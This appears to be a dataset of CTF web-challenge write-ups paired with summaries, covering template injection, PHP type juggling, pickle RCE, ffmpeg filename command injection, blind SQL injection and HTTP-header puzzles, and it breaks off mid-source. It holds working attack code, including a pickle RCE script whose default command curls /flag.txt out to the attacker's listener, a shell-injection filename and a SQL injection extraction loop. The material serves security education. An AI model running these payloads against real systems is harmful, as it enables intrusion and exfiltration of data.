You may think I walk with no 'name' because it can be changed whenever I want. I am a 'person' whose 'secret' can never be found. Can you find this 'person's 'secret'?
(I love you 8000.)
```

## Exploit

```python
#SOURCE CODE: server.py
import tornado.template
import tornado.ioloop
import tornado.web
import os, pwd, grp

def drop_privileges(uid_name='ctf', gid_name='ctf'):
    running_uid = pwd.getpwnam(uid_name).pw_uid
    running_gid = grp.getgrnam(gid_name).gr_gid

    os.setgroups([])

    os.setgid(running_gid)
    os.setuid(running_uid)

    old_umask = os.umask(0o077)


flag = open('rf.txt').read()
secret = open('cs.txt').read()

TEMPLATE = '''
<html>
 <head><title> 🐱‍👤Hello Hacker</title></head>
 <body style=""background: #00FFFF;text-align:center;"">
 <h1 style=""font-size:5rem;""> 🐱‍👤 The Usual Suspects 🐱‍👤 </h1>
 <br />
 <h2 style=""font-size:4rem;""> You Have Arrived! </h2>
 <br />
 <p style=""font-size:2rem;""> 
 <p>Hey, wanna know how I rate some ice-cream flavours?</p>
 <form method=""GET""  action='/'>
  <select id=""icecream"" name=""icecream"">
      <option value=""{{!chocolate}}"">chocolate</option>
      <option value=""{{!vanilla}}"">vanilla</option>
      <option value=""{{!butterscotch}}"">butterscotch</option>
  </select>
  <input type=""submit""></input>
 </form>
 <p>FOO</p>
 </p>
 <br/> <br/>
 <p style=""text-align:center; font-size:2rem;"">
 Oh I heard you're looking for my secret. <br>
 <b>{{secret}}</b>
 </p>
 </body>
</html>
'''

class MainHandler(tornado.web.RequestHandler):
 
    def get(self):

        chocolate = ""My fav!! 10/10, would eat again""
        vanilla = 'Vanilla is good too, but could be better, i give it a 7/10'
        butterscotch = 'Yuck, who even likes that. 1/10'
        
        template_data = TEMPLATE.replace(""FOO"",self.get_argument('icecream',''))
        t = tornado.template.Template(template_data)
        secret = ""Unfortunately, you aren't worthy""
        if self.get_secure_cookie(""admin"")==b""true"":
            secret = flag
        else:
            self.set_secure_cookie(""admin"", ""false"")
        self.write(t.generate(chocolate=chocolate,vanilla=vanilla, butterscotch=butterscotch, application=application, secret=secret))



application = tornado.web.Application([
    (r""/"", MainHandler)
], debug=True, static_path=None, template_path=None, cookie_secret=secret)

if __name__ == '__main__':
    drop_privileges()
    application.listen(9999)
    print(""Listening :)"")
    tornado.ioloop.IOLoop.instance().start()
```
<br />

- The server script runs on `http://chall.csivit.com:30279/`. Input is taken as the ""icecream"" value. 
 
- A secure cookie is being set and compared to print a flag value. In tornado, signed cookies contain the encoded value of the cookie
  alongwith a timestamp and an HMAC signature. Such cookies are supported by the set_secure_cookie and get_secure_cookie methods which require a specific secret key: cookie_secret.

- Upon visiting `http://chall.csivit.com:30279/?icecream={{globals()}}`, you see something useful:

```
'application': <tornado.web.Application object at 0x7f2976579750>,
```

- You now know that the name of the variable `tornado.web.Application(...)` is `application`.

- Run the server script with the exploit payload `http://chall.csivit.com:30279/?icecream={{application.settings[""cookie_secret""]}}` to get the cookie_secret value `MangoDB` displayed on the website.
  
- Replace the value of the secure cookie `admin` to the required comparison value `true` to obtain a signed cookie on the browser. Now, replace the signed cookie generated upon running the server script with the one obtained after the secure cookie value was set to `true`. This results in a cookie which looks like the following. Note `dHJ1ZQ==` is base64 for `true`.

```
""2|1:0|10:1594808471|5:admin|8:dHJ1ZQ==|5da7d1e446451e825e42001e7f07360e2e2e77c9c68b14fca1a517259712cdac""
```

- Upon reloading the server script, the text on the website would change from `Unfortunately, you aren't worthy` to the flag value:

```
csictf{h3r3_i_4m}
```


The flag is:
```
csictf{h3r3_i_4m}
```
","Description ""You may think I walk with no 'name' because it can be changed whenever I want. I am a 'person' whose 'secret' can never be found. Can you find this 'person's 'secret'?
(I love you 8000.)""

This challenge involves exploiting the server script through Tornado template injection to obtain the cookie secret and forging a signed cookie to access the flag.

- The server script runs on `http://chall.csivit.com:30279/`. Input is taken as the ""icecream"" value. 
 
- A secure cookie is being set and compared to print a flag value. In tornado, signed cookies contain the encoded value of the cookie
  alongwith a timestamp and an HMAC signature. Such cookies are supported by the set_secure_cookie and get_secure_cookie methods which require a specific secret key: cookie_secret.

- Upon visiting `http://chall.csivit.com:30279/?icecream={{globals()}}`, you see something useful:
`'application': <tornado.web.Application object at 0x7f2976579750>`

- You now know that the name of the variable `tornado.web.Application(...)` is `application`.

- Run the server script with the exploit payload `http://chall.csivit.com:30279/?icecream={{application.settings[""cookie_secret""]}}` to get the cookie_secret value `MangoDB` displayed on the website.
  
- Replace the value of the secure cookie `admin` to the required comparison value `true` to obtain a signed cookie on the browser. Now, replace the signed cookie generated upon running the server script with the one obtained after the secure cookie value was set to `true`. This results in a cookie which looks like the following. Note `dHJ1ZQ==` is base64 for `true`.
""2|1:0|10:1594808471|5:admin|8:dHJ1ZQ==|5da7d1e446451e825e42001e7f07360e2e2e77c9c68b14fca1a517259712cdac""

- Upon reloading the server script, the text on the website would change from `Unfortunately, you aren't worthy` to the flag value.
"
"# Warm Up

Author: [roerohan](https://github.com/roerohan)

## Description

This is a PHP Type Juggling Vulnerability.

## Requirements

- Docker: [Dockerfile](./Dockerfile)
- Php

## Sources

```
If you know, you know; otherwise you might waste a lot of time.
```

## Exploit

In this challenge, you can see the `index.php` code by default.

```php
<?php

if (isset($_GET['hash'])) {
    if ($_GET['hash'] === ""10932435112"") {
        die('Not so easy mate.');
    }

    $hash = sha1($_GET['hash']);
    $target = sha1(10932435112);
    if($hash == $target) {
        include('flag.php');
        print $flag;
    } else {
        print ""csictf{loser}"";
    }
} else {
    show_source(__FILE__);
}
?>
```
<br />

So, you see that we have to match the value of `hash` and `target`. It is checked that the `hash` param does not equal `10932435112`, but again it checks that the sha1 hash of `hash` is equal to that of `10932435112`. We know that the sha1 hashes will not match ever, so it's not a bruteforce challenge. Later, you notice that the `$hash` and the `$target` and matched using `==` and not `====`. `==` is vulnerable to type juggling!
<br />

If you see the hash of `10932435112`, it starts with `0e...`. So any other hash which starts with `0e` will match this with `==`, since `==` does not check types, so these will be treated as numbers. So, you have to bruteforce considerably lesser amount of values. You would find a lot of matches:

```
aaroZmOk
aaK1STfY
aaO8zKZF
...
```

Pass any of these with the GET param `hash`, and you get the flag.

```
/?hash=aaroZmOk
```

The flag is:

```
csictf{typ3_juggl1ng_1n_php}
```","In this challenge, you can see the `index.php` code by default.

So, you see that we have to match the value of `hash` and `target`. It is checked that the `hash` param does not equal `10932435112`, but again it checks that the sha1 hash of `hash` is equal to that of `10932435112`. We know that the sha1 hashes will not match ever, so it's not a bruteforce challenge. Later, you notice that the `$hash` and the `$target` and matched using `==` and not `====`. `==` is vulnerable to type juggling!

If you see the hash of `10932435112`, it starts with `0e...`. So any other hash which starts with `0e` will match this with `==`, since `==` does not check types, so these will be treated as numbers. So, you have to bruteforce considerably lesser amount of values. 

You would find a lot of matches.

Pass any of these with the GET param `hash`, and you get the flag.
"
"# flask_caching

Author: [roerohan](https://github.com/roerohan) and [thebongy](https://github.com/thebongy)

# Requirements

- Python

# Source

- [app.py](./app.py)

```
cache all the things (this is python3)

http://web.chal.csaw.io:5000
```

# Exploitation

```py
# app.py

from flask_caching import Cache
```

When you look at the documentation for the source for the `flask_caching` module, you can optionally store a python pickle in the redis by prepending it with `'!'`. You can use python pickles for RCE, when the caching modules uses `pickle.load()` to load the cached data.

Set up a netcat listener on your server and run the following script with your IP and PORT.

```py
import pickle
import sys
import base64
import requests
import time

IP = '0.0.0.0' # Your IP here
PORT = 8000
DEFAULT_COMMAND=f'curl -d ""$(cat /flag.txt)"" {IP}:{PORT}'
COMMAND = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_COMMAND

class PickleRce(object):
    def __reduce__(self):
        import os
        return (os.system,(COMMAND,))

f = open('payload', 'wb')
f.write(b'!'+pickle.dumps(PickleRce()))
f.close()

time.sleep(0.5)

data = open('payload', 'rb').read()
print(data)
url = 'http://web.chal.csaw.io:5000/'

test = 'test23'

requests.post(url, files={ 'content': ('content', open('payload', 'rb').read()) }, data={ 'title': f'flask_cache_view//{test}' })

r = requests.get(url + test)
print(r.text)
```

On your netcat listener, you would get:

```
POST / HTTP/1.1
Host: yourhost:yourport
User-Agent: curl/7.69.1
Accept: */*
Content-Length: 16
Content-Type: application/x-www-form-urlencoded

flag{f1@sK_10rD}
```

The flag is:

```
flag{f1@sK_10rD}
```","When you look at the documentation for the source for the `flask_caching` module, you can optionally store a python pickle in the redis by prepending it with `'!'`. You can use python pickles for RCE, when the caching modules uses `pickle.load()` to load the cached data.

Set up a netcat listener on your server and run the following script with your IP and PORT.
[Python script: Create a payload for RCE and send it to the server]

On your netcat listener, you would get the flag.
[HTTP POST request with the flag]
"
"# Gif2png

Author: [roerohan](https://github.com/roerohan)

# Requirements

- Flask

# Source

```
The webdev department created another cool startup. Here you can convert any animated GIF to PNG images. It's only left to figure out how to monetize it: gif2png-cybrics2020.ctf.su/
```

```py
import logging
import re
import subprocess
import uuid
from pathlib import Path

from flask import Flask, render_template, request, redirect, url_for, flash, send_from_directory
from flask_bootstrap import Bootstrap
import os
from werkzeug.utils import secure_filename
import filetype


ALLOWED_EXTENSIONS = {'gif'}

app = Flask(__name__)
app.config['UPLOAD_FOLDER'] = './uploads'
app.config['SECRET_KEY'] = '********************************'
app.config['MAX_CONTENT_LENGTH'] = 500 * 1024  # 500Kb
ffLaG = ""cybrics{********************************}""
Bootstrap(app)
logging.getLogger().setLevel(logging.DEBUG)

def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS


@app.route('/', methods=['GET', 'POST'])
def upload_file():
    logging.debug(request.headers)
    if request.method == 'POST':
        if 'file' not in request.files:
            logging.debug('No file part')
            flash('No file part', 'danger')
            return redirect(request.url)

        file = request.files['file']
        if file.filename == '':
            logging.debug('No selected file')
            flash('No selected file', 'danger')
            return redirect(request.url)

        if not allowed_file(file.filename):
            logging.debug(f'Invalid file extension of file: {file.filename}')
            flash('Invalid file extension', 'danger')
            return redirect(request.url)

        if file.content_type != ""image/gif"":
            logging.debug(f'Invalid Content type: {file.content_type}')
            flash('Content type is not ""image/gif""', 'danger')
            return redirect(request.url)

        if not bool(re.match(""^[a-zA-Z0-9_\-. '\""\=\$\(\)\|]*$"", file.filename)) or "".."" in file.filename:
            logging.debug(f'Invalid symbols in filename: {file.content_type}')
            flash('Invalid filename', 'danger')
            return redirect(request.url)

        if file and allowed_file(file.filename):
            filename = secure_filename(file.filename)
            file.save(os.path.join(app.config['UPLOAD_FOLDER'], file.filename))

            mime_type = filetype.guess_mime(f'uploads/{file.filename}')
            if mime_type != ""image/gif"":
                logging.debug(f'Invalid Mime type: {mime_type}')
                flash('Mime type is not ""image/gif""', 'danger')
                return redirect(request.url)

            uid = str(uuid.uuid4())
            os.mkdir(f""uploads/{uid}"")

            logging.debug(f""Created: {uid}. Command: ffmpeg -i 'uploads/{file.filename}' \""uploads/{uid}/%03d.png\"""")

            command = subprocess.Popen(f""ffmpeg -i 'uploads/{file.filename}' \""uploads/{uid}/%03d.png\"""", shell=True)
            command.wait(timeout=15)
            logging.debug(command.stdout)

            flash('Successfully saved', 'success')
            return redirect(url_for('result', uid=uid))

    return render_template(""form.html"")


@app.route('/result/<uid>/')
def result(uid):
    images = []
    for image in os.listdir(f""uploads/{uid}""):
        mime_type = filetype.guess(str(Path(""uploads"") / uid / image))
        if image.endswith("".png"") and mime_type is not None and mime_type.EXTENSION == ""png"":
            images.append(image)

    return render_template(""result.html"", uid=uid, images=images)


@app.route('/uploads/<uid>/<image>')
def image(uid, image):
    logging.debug(request.headers)
    dir = str(Path(app.config['UPLOAD_FOLDER']) / uid)
    return send_from_directory(dir, image)


@app.errorhandler(413)
def request_entity_too_large(error):
    return ""File is too large"", 413


if __name__ == ""__main__"":
    app.run(host='localhost', port=5000, debug=False, threaded=True)
```

# Exploitation

The following line is critical:

```python
command = subprocess.Popen(f""ffmpeg -i 'uploads/{file.filename}' \""uploads/{uid}/%03d.png\"""", shell=True)
```

Here, you can do RCE with the file name. The idea is to `grep` the flag from the `main.py` file, and write it on the image which the gif is going to get converted to. This can be done with the `-vf drawtext=...""` option. Here's the payload.

```
csictf.gif' -vf drawtext=\""text=$(grep ffLaG main.py)\""'.gif
```

When you upload this gif, you get the flag written on the resulting `png`.
<br />

The flag is:

```
cybrics{imagesaresocoolicandrawonthem}
```
","The critical line in the code is:
[Python code: Use subprocess.Popen to call FFmpeg]

Here, you can perform Remote Code Execution (RCE) with the file name. The idea is to grep the flag from the main.py file and write it on the image to which the GIF is going to be converted. This can be done with the -vf drawtext=... option. The payload used is:
[Payload: Include grep and drawtext options in the file name]

When you upload a GIF with this payload as the file name, you will receive a resulting PNG with the flag written on it.
"
"# Hunt

Author: [roerohan](https://github.com/roerohan)

# Requirements

- Browser Devtools

# Source

- http://109.233.57.94:54040/

# Exploitation

In this challenge, you see a bunch of captcha's floating around on your screen, and the goal is to successfully get 5 captchas. There's many ways to solve this, here's what I did:
<br />

When you see the source, this is the function which creates the captchas and makes them move:

```javascript
function addCaptcha() {
    const captchaBox = document.createElement('div');
    const widgetId = grecaptcha.render(captchaBox, {
        'sitekey' : '6Ld0sCEUAAAAAKu8flcnUdVb67kCEI_HYKSwXGHN',
        'theme' : 'light',
        'callback': 'good',
    });

    captchaBox.className = 'captcha';
    document.body.appendChild(captchaBox);

    count ++;
    updateStatus();

    let dividerA = (Math.random() * 250) + 250;
    let dividerB = (Math.random() * 250) + 250;
    let dividerC = (Math.random() * 25) + 25;

    function loop() {
        const height = window.innerHeight - captchaBox.offsetHeight;
        captchaBox.style.top = Math.sin(Date.now()/dividerA) * (height/2) + (height/2);

        const width = window.innerWidth - captchaBox.offsetWidth;
        captchaBox.style.left = Math.sin(Date.now()/dividerB) * (width/2) + (width/2);

        captchaBox.style.transform = `rotate(${Math.sin(Date.now()/dividerC) * 10}deg)`;

        setTimeout(loop, 1);
    }
    loop();
}
```

Just modify this function using your devtools, remove the part where it runs loop.

```js
function addCaptcha() {
    const captchaBox = document.createElement('div');
    const widgetId = grecaptcha.render(captchaBox, {
        'sitekey' : '6Ld0sCEUAAAAAKu8flcnUdVb67kCEI_HYKSwXGHN',
        'theme' : 'light',
        'callback': 'good',
    });

    captchaBox.className = 'captcha';
    document.body.appendChild(captchaBox);

    count ++;
    updateStatus();
}
```

Now, you can manually add 5 captchas and get them. Just call the function `addCaptcha()` and keep clicking the boxes. When you're done with 5, click on `GET FLAG`, and copy the flag from the screen!

The flag is:

```
cybrics{Th0se_c4p7ch4s_c4n_hunter2_my_hunter2ing_hunter2}
```
","In this challenge, you see a bunch of captcha's floating around on your screen, and the goal is to successfully get 5 captchas. There's many ways to solve this, here's what was done:

When you see the source, this is the function which creates the captchas and makes them move:
[JavaScript code: Captcha creation and movement function]

To make it easier to solve the captchas, modify this function using your browser's developer tools, removing the part where it runs the loop, which is responsible for moving the captchas.
[Modified JavaScript code: Captcha creation function without movement]

Now, you can manually add 5 captchas and get them. Just call the function `addCaptcha()` and keep clicking the boxes. When you're done with 5, click on `GET FLAG`, and copy the flag from the screen!
"
"# Curly Fries 1 - Web

Author - [UnknownAbyss](https://github.com/UnknownAbyss)

Requirements : cURL

* * *

The challenge gives us the following text -

> Normal fries are nice, but everything's better with a curl in it. The flag is right in front of you.


```
very.uniquename.xyz:8880
```

#### Upon opening the link we see -

<p align=""center""><img src=""https://i.imgur.com/pa1MPge.png"" alt=""Chall Image""></p>

This screams sweden. So we try to set the language headers to swedish

```sh
curl -H ""Accept-Language: sv-SE"" very.uniquename.xyz:8880
```

This gives us the flag...
```
dsc{1_l0v3_sw3d3n}
```
","The challenge gives us the following text:
""Normal fries are nice, but everything's better with a curl in it. The flag is right in front of you.""

Upon opening the link, an image is displayed, which hints at Sweden. So, the solution involves setting the language headers to Swedish using a ""curl"" command.
[Shell command: Set Accept-Language header to Swedish]

Executing this command returns the flag.
"
"# Curly Fries 2 - Web

Author - [UnknownAbyss](https://github.com/UnknownAbyss)

Requirements : cURL

* * *

The challenge gives us the following text -

> Normal fries are nice, but everything's better with a curl in it. Why do logos make things so recognizable?


```
very.uniquename.xyz:2052    
```

#### Upon opening the link we see -

<p align=""center""><img src=""https://i.imgur.com/h0cj6FI.png"" alt=""Chall Image""></p>

We see the logo of xbox and linux on the screen. This is me accessing this page on a windows device

Putting User-Agent as Linux...

```sh
curl -H ""User-Agent: Linux"" very.uniquename.xyz:2052
```

...we get this back

```html
...
<body>
<article class=""xbox""><img src=""https://compass-ssl.xbox.com/assets/f8/17/f817aa8c-02c1-4ba9-84a8-20d357d52939.jpg?n=Microsoft-Store-2018_Feature-0_Pay_1040x585.jpg"" alt=""Xbox""></article>
</body>
...
```

We see the linux logo is gone. Hence we put user agent as both Linux and Xbox

```sh
curl -H ""User-Agent: Linux Xbox"" very.uniquename.xyz:2052
```

This gives us the flag inside the body of the page...
```
dsc{1m4g1n3_l1nux_0n_4n_xb0x}
```
","The challenge gives us the following text:
""Normal fries are nice, but everything's better with a curl in it. Why do logos make things so recognizable?""

Upon opening the link, an image is displayed that shows the logos of Xbox and Linux. This is viewed on a Windows device.

To change the User-Agent to Linux, use the following command:
[Shell command: Set User-Agent header to Linux]

Executing this command returns a response with the Linux logo gone.

Next, set the User-Agent to both Linux and Xbox:
[Shell command: Set User-Agent header to Linux Xbox]

Executing this command gives the flag inside the body of the page.
"
"# Curly Fries 3 - Web

Author - [BlackJack](http://github.com/Mannan-Goyal)

Requirements : cURL, Network Headers and HTTP Methods

* * *

When we start to solve the challenge we are faced with a hint and a link -

> Normal fries are nice, but everything's better with a curl in it. I'm with you, every step of the way.


```
overly.uniquename.xyz:2095
```

#### Upon opening the link we see -

<p align=""center""><img src=""https://imgur.com/0RwPl3k.png"" alt=""Chall Image""></p>

So we try changing the Method to POST instead of GET whilst using cURL

```sh
curl -i -X POST http://overly.uniquename.xyz:2095/
```

In response we get -
```
perhaps try Googling me instead?
```

After seeing this, the initial thoughts were to visit the page as a Google bot, hence we tried to change the `User-Agent` header to that of a chrome crawler
```
curl -i -X POST -H ""User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"" http://overly.uniquename.xyz:2095/
```

After trying many variations of the above, we tried to set the Referer as google.com

```sh
curl -i -X POST -H ""Referer: https://www.google.com"" http://overly.uniquename.xy
z:2095/
```

which returned -
```
did you attend that lovely dinner party Hosted by dscvit?
```

This was pretty clear we need to set the host as dscvit.com

```sh
curl -i -X POST -H ""Referer: https://www.google.com"" -H ""Host: https://www.dscvit.com"" http://overly.uniquename.xyz:2095/
```

which returned -
```
potates and carrots are my friends, milk and Cookies will be my end
```

This is where we were stuck for hours, it was obvious that we needed to set the cookie as something but after trying from bugs bunny other cartoon charachters and giving up several times, we tried `user=root` cause potato and carrots are root vegetables. However, what was the use of milk there? I am clueless!

```
curl -i -X POST -H ""Referer: https://www.google.com"" -H ""Host: https://www.dscvit.com"" --cookie ""user=root"" http://overly.uniquename.xyz:2095/
```

which returns -
```
JFATHER, JMOTHER, JDAUGHTER, ____?
```
This is also a pretty obvious hint we need to set Content-Type as JSON

```
curl -i -X POST -H ""Referer: https://www.google.com"" -H ""Host: https://www.dscvit.com"" -H ""Content-Type: application/json"" --cookie ""user=root"" http://overly.uniquename.xyz:2095/
```

which returned -
```
{'error': 'json data missing'}
```

Therefore adding data to the request-
```
curl -i -X POST -H ""Referer: https://www.google.com"" -H ""Host: https://www.dscvit.com"" -H ""Content-Type: application/json"" --cookie ""user=root"" -d '{""foo"":""bar""}' http://overly.uniquename.xyz:2095/
```

which returned -
```
{'error': {'messi': 'required'}}
```

Therefore adding messi to JSON-
```
curl -i -X POST -H ""Referer: https://www.google.com"" -H ""Host: https://www.dscvit.com"" -H ""Content-Type: application/json"" --cookie ""user=root"" -d '{""messi"":""bar""}' http://overly.uniquename.xyz:2095/
```
which returned -
```
{'error': {'messi': 'which club am i at?'}}
```

Therefore adding PSG to JSON-
```
curl -i -X POST -H ""Referer: https://www.google.com"" -H ""Host: https://www.dscvit.com"" -H ""Content-Type: application/json"" --cookie ""user=root"" -d '{""messi"":""psg""}' http://overly.uniquename.xyz:2095/
```

which returned -
```
Congrats! The flag is dsc{th15_15_w4y_t00_much_w0rk}
```
Yes it is too much work xD
 
- So finally the flag is
`dsc{th15_15_w4y_t00_much_w0rk}`
","The challenge provides the following hint: ""Normal fries are nice, but everything's better with a curl in it. I'm with you, every step of the way.""

Upon opening the link, an image is displayed. To solve the challenge, a series of curl commands were executed with various headers, cookies, and JSON data. Here's the process:

Change the method to POST and send a request to the URL.

Set the Referer header to Google and send a request to the URL. In response, you receive a hint to attend a dinner party hosted by dscvit.

Set the Host header to dscvit.com and send a request to the URL. The response mentions potatoes, carrots, milk, and cookies.

Set the user cookie to ""root"" and send a request to the URL, as potatoes and carrots are root vegetables. The response contains a JSON-related hint.

Set the Content-Type header to application/json, include JSON data, and send a request to the URL. The response points out that ""messi"" is required in the JSON data.

Add ""messi"" to the JSON data and send a request to the URL. The response asks for the club Messi is in.
Change the ""messi"" value to ""psg"" and send a request to the URL, since Messi is playing for PSG at the time.

After executing the final command, the flag is returned."
"# Gate Keeper

Author: [roerohan](https://github.com/roerohan)

## Exploit

SQL Injection. This also works for the [Taxi Union](../taxi%20union) challenge.

```py
import requests
import string

flag = ''

print(flag)

domain = string.ascii_lowercase + string.ascii_uppercase + string.digits + '_}'

f = 0

challenge = ""gate keeper""
url = """"
check = """"
key = """"
column = """"
if challenge == ""taxi union"":
    url = 'http://extremely.uniquename.xyz:2052/'
    check = ""TN-06-AP-9879""
    key = 'lisence_plate'
    column = ""location""
elif challenge == 'gate keeper':
    url = 'http://extremely.uniquename.xyz:2082/'
    check = ""The flag for the CTF is the password you entered.(If you havent cheated that is)""
    key = 'password'
    column = ""password""

print(""URL"", url)

while True:
    for char in domain:
        payload = ""' or {} like '{}%'; --"".format(column, flag + char)
        print(payload)

        r = requests.post(url, data={key: payload})

        if (check in r.text):
            flag = flag + char
            print(""Success "" + flag)

            break
```","This Python script demonstrates an SQL Injection attack against the web application's database to solve the ""Taxi Union"" and ""Gate Keeper"" challenges. The script performs the following steps:
[Import the necessary libraries and initialize the variables.
Set the appropriate URL, check string, key, and column values based on the selected challenge (either ""Taxi Union"" or ""Gate Keeper"").
Iterate through each character in the domain (letters, digits, and special characters) while searching for the flag.
For each character, create an SQL injection payload that checks if the current flag value concatenated with the character is a prefix of the targeted column's value.
Send an HTTP POST request to the URL with the payload as the form data.
If the check string is found in the response, it means the character is part of the flag. Add the character to the flag and continue iterating through the domain.
Repeat the process until the entire flag is discovered.]

The Python script helps to find the flag by exploiting SQL injection vulnerability in the web application.
"
"# Hungry Man - Web

Author - [UnknownAbyss](https://github.com/UnknownAbyss)

Requirements : Python, cURL

* * *

The challenge gives us the following text -

> There is nothing here I promise! ;)


```
very.uniquename.xyz:2095
```

#### Upon opening the link we see -

<p align=""center""><img src=""https://i.imgur.com/HsXPiDO.png"" alt=""Chall Image""></p>


Checking the network tab, we find the following response header

<p align=""center""><img src=""https://i.imgur.com/sYB2iGY.png"" alt=""Chall Image""></p>

We send the following curl request setting the cookie to the given string

```sh
curl -H ""Cookie: flag=c29tZXRpbWVzIHRoZSBrZXkgdG8gdW5sb2NraW5nIHRoZSBhbnN3ZXIgaXMgdGhlIHF1ZXN0aW9uIGl0c2VsZi4uLiBidXQgbXkgZmF2b3JpdGUgaXMgY2hvY28gY2hpcA=="" very.uniquename.xyz:2095
```

The repsonse is...

```
{""flag"":""522748524ad010358705b6852b81be4c""}
```

Then sending this new cookie...

```sh
curl -H ""Cookie: flag=522748524ad010358705b6852b81be4c"" very.uniquename.xyz:2095
```

The repsonse is...

```
{""flag"":""70e9490b5d5a217070c1e7df9518e9d5""}
```

Let us write a script for this...

```py
import requests


url = 'http://very.uniquename.xyz:2095'
flags = ['c29tZXRpbWVzIHRoZSBrZXkgdG8gdW5sb2NraW5nIHRoZSBhbnN3ZXIgaXMgdGhlIHF1ZXN0aW9uIGl0c2VsZi4uLiBidXQgbXkgZmF2b3JpdGUgaXMgY2hvY28gY2hpcA==']


while (flags[-1]!='EOF'):
    x = requests.get(url, cookies={'flag': flags[-1]}).text
    flags.append(x[9:-3 ])

for i in flags[1:-1]:
    print(i)
```

This gives us the following output

```
522748524ad010358705b6852b81be4c
70e9490b5d5a217070c1e7df9518e9d5
60173ca988f93d0a7da64f3327ad336c
45ec864b6976a208c6af1a37e2c61c3a
046bf0a7d0d641c527765a02816eca9f
24cafc74b88dfafb0524ecc85a76f8bd
f3ea97d2cd1f5619f570c06a10a041b5
fa4f4d80f554c6845daf73511d75e6bc
72e6f6e0f08ca88f02b1480464afd55b
97d243cd9c2513d20fff6d5677b2b62b
ffc987113c7a22fb2a52b6f9842f79be
a61c8204ca3eb98c9da7344cf0fba066
9bea76c2f9cb9140f837ee4518b6749c
```

This appears to be an MD5 hash. We decode these and find the following string

```
ds
c{
91v
3_m
3_4
_h
4n
dfu
1_0
f_
c00
k13
5}
```

This is the flag...
```
dsc{91v3_m3_4_h4ndfu1_0f_c00k135}
```","The challenge begins with the given text: ""There is nothing here I promise! ;)""

Upon opening the link, an image is displayed. By checking the network tab, a response header with a specific string is found. A curl request is then sent, setting the cookie to the given string.

The response contains another string. A new curl request is sent with this new string as the cookie.

To automate this process, a Python script is written:
[Define the initial URL and the first flag value.
Create a loop that continues until the final flag value, 'EOF', is found.
In each iteration, send an HTTP GET request to the URL with the current flag value as a cookie.
Append the received string to the list of flags and continue iterating.
Once the loop is finished, print the received strings.]

The output contains multiple strings, which appear to be MD5 hashes. After decoding these hashes, a sequence of characters is obtained, which is the flag.
"
"# Taxi Union

Author: [roerohan](https://github.com/roerohan)

## Exploit

SQL Injection. This solution also works for the [Gate Keeper](../gate%20keeper) challenge.

```py
import requests
import string

flag = ''

print(flag)

domain = string.ascii_lowercase + string.ascii_uppercase + string.digits + '_}'

f = 0

challenge = ""gate keeper""
url = """"
check = """"
key = """"
column = """"
if challenge == ""taxi union"":
    url = 'http://extremely.uniquename.xyz:2052/'
    check = ""TN-06-AP-9879""
    key = 'lisence_plate'
    column = ""location""
elif challenge == 'gate keeper':
    url = 'http://extremely.uniquename.xyz:2082/'
    check = ""The flag for the CTF is the password you entered.(If you havent cheated that is)""
    key = 'password'
    column = ""password""

print(""URL"", url)

while True:
    for char in domain:
        payload = ""' or {} like '{}%'; --"".format(column, flag + char)
        print(payload)

        r = requests.post(url, data={key: payload})

        if (check in r.text):
            flag = flag + char
            print(""Success "" + flag)

            break
```","This solution demonstrates a SQL Injection attack to solve a CTF challenge. The script also works for the `Gate Keeper` challenge. Here's a high-level explanation of the Python script:
[Import the necessary libraries: `requests` and `string`.
Initialize an empty `flag` variable, and define the search domain containing all possible characters.
Set the challenge, URL, check, key, and column variables based on the challenge being solved (either ""taxi union"" or ""gate keeper"").
Enter an infinite loop that iterates through each character in the search domain.
For each character, create a payload containing a SQL injection query using the current flag and character.
Send an HTTP POST request to the URL with the payload as the data.
Check if the expected response text is found in the received response.
If the expected response is found, add the character to the flag and print it.
Break the loop once the flag is found.]

The script automates the process of testing various payloads to exploit the SQL Injection vulnerability and retrieve the flag.
"
"# Log Me In

Author: [roerohan](https://github.com/roerohan)


# Requirements

- Express.js
- Body Parser

# Source

- https://log-me-in.web.ctfcompetition.com/

```
Log in to get the flag
```

```js
/**
 * @fileoverview Description of this file.
 */

const mysql = require('mysql');
const express = require('express');
const cookieSession = require('cookie-session');
const cookieParser = require('cookie-parser');
const bodyParser = require('body-parser');

const flagValue = ""...""
const targetUser = ""michelle""

const {
  v4: uuidv4
} = require('uuid');

const app = express();
app.set('view engine', 'ejs');
app.set('strict routing', true);

/* strict routing to prevent /note/ paths etc. */
app.set('strict routing', true)
app.use(cookieParser());

/* secure session in cookie */
app.use(cookieSession({
  name: 'session',
  keys: ['...'] //don't even bother
}));

app.use(bodyParser.urlencoded({
  extended: true
}))

app.use(function(req, res, next) {
  if(req && req.session && req.session.username) {
    res.locals.username = req.session.username
    res.locals.flag = req.session.flag
  } else {
    res.locals.username = false
    res.locals.flag = false
  }
  next()
});

/* server static files from static folder */
app.use('/static', express.static('static'))

app.use(function( req, res, next) {
  if(req.get('X-Forwarded-Proto') == 'http') {
      res.redirect('https://' + req.headers.host + req.url)
  } else {
    if (process.env.DEV) {
      return next()
    } else  {
    return next()
    }
  }
});
// MIDDLEWARE ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

/* csrf middleware, csrf_token stored in the session cookie */
const csrf = (req, res, next) => {
  const csrf = uuidv4();
  req.csrf = req.session.csrf || uuidv4();
  req.session.csrf = csrf;
  res.locals.csrf = csrf;

  nocache(res);

  if (req.method == 'POST' && req.csrf !== req.body.csrf) {
    return res.render('index', {error: 'Invalid CSRF token'});
  }

  next();
}

/* disable cache on specifc endpoints */
const nocache = (res) => {
  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
  res.setHeader('Pragma', 'no-cache');
  res.setHeader('Expires', '0');
}

/* auth middleware */
const auth = (req, res, next) => {
  if (!req.session || !req.session.username) {
    return res.render('index', {error:""You must be logged in to access that""});
  }
  next()
}

// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~`
app.get('/logout', (req, res) => {
  req.session = null;
  res.redirect('/');
});


app.get('/', csrf, (req, res) => {
  res.render('index');
});

app.get('/about', (req, res) => {
  res.render('about');

});
app.get('/me', auth, (req, res) => {
  res.render('profile');
});

app.get('/flag', csrf, auth, (req, res) => {
  res.render('premium')
});

app.get('/login', (req, res) => {
  res.render('login');
});

app.post('/login', (req, res) => {
  const u = req.body['username'];
  const p = req.body['password'];

